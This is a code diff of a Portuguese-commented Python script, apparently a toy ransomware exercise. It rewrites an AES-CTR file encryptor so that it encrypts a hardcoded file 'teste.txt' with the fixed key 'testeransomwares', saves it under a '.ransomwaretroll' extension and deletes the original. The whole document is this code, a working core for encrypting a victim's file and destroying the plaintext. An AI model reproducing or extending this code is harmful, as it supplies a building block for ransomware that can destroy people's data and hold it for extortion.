@@ -1,81 +1,35 @@
 import os
 import pyaes
 
-def encrypt_file(file_path, key):
-    """
-    Criptografa um arquivo usando AES no modo CTR.
-
-    Args:
-        file_path (str): Caminho completo do arquivo a ser criptografado.
-        key (bytes): Chave de criptografia (16, 24 ou 32 bytes).
-
-    Returns:
-        str: Caminho do novo arquivo criptografado.
-
-    Raises:
-        FileNotFoundError: Se o arquivo não existir.
-        ValueError: Se a chave não for válida.
-    """
-    # Verificar existência do arquivo
-    if not os.path.isfile(file_path):
-        raise FileNotFoundError(f"Arquivo não encontrado: {file_path}") 
-
-    # Validar tamanho da chave
-    if len(key) not in (16, 24, 32):
-        raise ValueError("A chave deve ter 16, 24 ou 32 bytes (AES-128, AES-192, AES-256).")
-    # Ler os dados do arquivo
-    with open(file_path, "rb") as file:
+def criptografar_arquivo(file_name: str, key: bytes):
+    """Criptografa um arquivo usando AES em modo CTR e salva o resultado em um novo arquivo."""
+    
+    # Lê o conteúdo do arquivo original
+    with open(file_name, 'rb') as file:
         file_data = file.read()
 
-    # Configurar a criptografia AES
+    # Criptografa os dados do arquivo
     aes = pyaes.AESModeOfOperationCTR(key)
+    crypto_data = aes.encrypt(file_data)
 
-   # Criptografar os dados
-    encrypted_data = aes.encrypt(file_data)
-   # Criar o nome do novo arquivo criptografado
-    encrypted_file_path = f"{file_path}.encrypted"
-   # Salvar os dados criptografados
-    with open(encrypted_file_path, "wb") as encrypted_file:
-       encrypted_file.write(encrypted_data)
-      # Remover o arquivo original com segurança
-    os.remove(file_path)
+    # Define o nome do novo arquivo criptografado
+    new_file_name = f"{file_name}.ransomwaretroll"
 
-    return encrypted_file_path
+    # Salva o arquivo criptografado
+    with open(new_file_name, 'wb') as new_file:
+        new_file.write(crypto_data)
 
-def validate_key_length(key):
-    """
-    Valida o comprimento da chave de criptografia.
+    # Remove o arquivo original após a criptografia
+    os.remove(file_name)
 
-    Args:
-        key (bytes): A chave de criptografia.
-
-    Raises:
-        ValueError: Se o comprimento da chave for inválido.
-    """
-    if len(key) not in (16, 24, 32):
-        raise ValueError("A chave deve ter 16, 24 ou 32 bytes para AES.")
-def main():
-    """
-    Função principal para executar o programa de criptografia.
-    """
-    # Configuração do caminho do arquivo e chave de criptografia
-    file_path = input("Digite o caminho completo do arquivo a ser criptografado: ").strip()
-    key = input("Digite a chave de criptografia (16, 24 ou 32 caracteres): ").strip().encode()
-
-    try:
-        # Validar o comprimento da chave
-        validate_key_length(key)
-
-        # Criptografar o arquivo
-        encrypted_file_path = encrypt_file(file_path, key)
-        print(f"Arquivo criptografado com sucesso: {encrypted_file_path}")
-
-    except FileNotFoundError as e:
-        print(f"Erro: {e}")
-    except ValueError as e:
-        print(f"Erro: {e}")
-    except Exception as e:
-        print(f"Ocorreu um erro inesperado: {e}")
+    print(f"Arquivo criptografado com sucesso: {new_file_name}")
 
 if __name__ == "__main__":
-    main()
+    # Nome do arquivo a ser criptografado
+    file_name = "teste.txt"
+    
+    # Chave de criptografia (deve ser 16, 24 ou 32 bytes)
+    key = b"testeransomwares"  # Chave de 16 bytes
+
+    # Criptografa o arquivo
+    criptografar_arquivo(file_name, key)
